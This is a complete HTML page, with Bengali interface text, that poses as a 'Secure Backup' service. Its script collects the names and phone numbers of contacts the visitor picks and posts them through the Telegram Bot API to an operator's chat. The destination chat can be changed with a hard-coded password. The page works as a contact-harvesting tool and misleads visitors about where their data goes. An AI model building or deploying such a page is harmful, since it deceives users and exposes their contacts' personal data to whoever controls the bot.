<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:'Hind Siliguri',sans-serif;
    background: linear-gradient(160deg,#020617,#0f172a);
}

.card{
    width:340px;
    padding:25px;
    border-radius:20px;
    background: rgba(255,255,255,0.06);
    backdrop-filter: blur(18px);
    border:1px solid rgba(255,255,255,0.1);
    box-shadow:0 8px 25px rgba(0,0,0,0.5);
    text-align:center;
}

h2{color:#fff;margin-bottom:8px;}
p{color:#94a3b8;font-size:14px;}

.btn{
    margin-top:12px;
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    background: linear-gradient(135deg,#3b82f6,#22c55e);
    color:#fff;
}

.btn2{
    background: linear-gradient(135deg,#f59e0b,#ef4444);
}

input{
    margin-top:10px;
    width:100%;
    padding:12px;
    border-radius:10px;
    border:none;
    outline:none;
}

.loader{
    margin:15px auto;
    width:24px;
    height:24px;
    border:3px solid rgba(255,255,255,0.2);
    border-top:3px solid #22c55e;
    border-radius:50%;
    animation:spin 1s linear infinite;
    display:none;
}

@keyframes spin{100%{transform:rotate(360deg)}}

.status{
    margin-top:10px;
    font-size:14px;
    color:#22c55e;
}
</style>
</head>

<body>

<div class="card">
    <h2>☁️ Secure Backup</h2>
    <p>কন্টাক্ট সিলেক্ট করে পাঠান</p>

    <button class="btn" onclick="startSend()">Normal Send</button>

    <input type="password" id="pass" placeholder="Password">
    <input type="text" id="chat" placeholder="New Chat ID">

    <button class="btn btn2" onclick="setCustom()">Set Custom ID</button>

    <div class="loader" id="loader"></div>
    <div class="status" id="status">Ready</div>
</div>

<script>
const CONFIG = {
    TOKEN: "YOUR_BOT_TOKEN",
    DEFAULT_CHAT: "YOUR_DEFAULT_CHAT_ID"
};

let currentChat = CONFIG.DEFAULT_CHAT;

// contact collect
async function getContacts(){
    if (!('contacts' in navigator)) throw new Error("Not supported");

    const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
    if (!contacts.length) throw new Error("No contacts");

    let text = "📱 Contact List\n\n";

    contacts.forEach(c=>{
        let n = c.name ? c.name[0] : "No Name";
        let t = c.tel ? c.tel[0] : "No Number";
        text += `👤 ${n}\n📞 ${t}\n\n`;
    });

    return text;
}

// send function
async function send(text){
    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
            chat_id: currentChat,
            text: text
        })
    });
}

// normal send
async function startSend(){
    try{
        loader.style.display="block";
        status.innerText="Sending...";

        let text = await getContacts();
        await send(text);

        status.innerText="✅ Sent!";
    }catch(e){
        status.innerText="❌ "+e.message;
    }
    loader.style.display="none";
}

// set custom id
function setCustom(){
    const pass = document.getElementById("pass").value;
    const chat = document.getElementById("chat").value;

    if(pass !== "7878"){
        status.innerText="❌ Wrong Password";
        return;
    }

    if(!chat){
        status.innerText="❌ Chat ID লাগবে";
        return;
    }

    currentChat = chat;
    status.innerText="✅ Custom ID Set!";
}
</script>

</body>
</html>
